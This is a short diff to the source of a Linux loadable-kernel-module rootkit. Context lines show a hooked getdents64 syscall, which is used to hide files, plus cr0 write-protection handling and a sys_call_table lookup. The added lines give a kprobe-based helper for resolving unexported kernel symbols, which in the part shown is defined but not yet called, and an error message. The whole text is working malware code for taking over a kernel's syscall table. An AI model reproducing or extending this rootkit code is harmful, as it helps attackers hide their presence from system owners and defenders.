@@ -4,6 +4,7 @@
 #include <linux/unistd.h>
 #include <linux/kallsyms.h>
 #include "cr0_rw.h"
+#include <linux/kprobes.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Naing/Hwani");
@@ -21,10 +22,22 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
     return original_getdents64(regs);
 }
 
+static unsigned long lookup_symbol(const char *name) {
+    struct kprobe kp = { .symbol_name = name };
+    unsigned long addr;
+
+    if (register_kprobe(&kp) < 0) return 0;
+    addr = (unsigned long)kp.addr;
+    unregister_kprobe(&kp);
+
+    return addr;
+}
+
 static int __init rootkit_init(void) {
     __syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 
     if (!__syscall_table) {
+        printk(KERN_ERR "LKM_ROOTKIT: Failed to locate sys_call_table\n");
         return -1;
     }
 
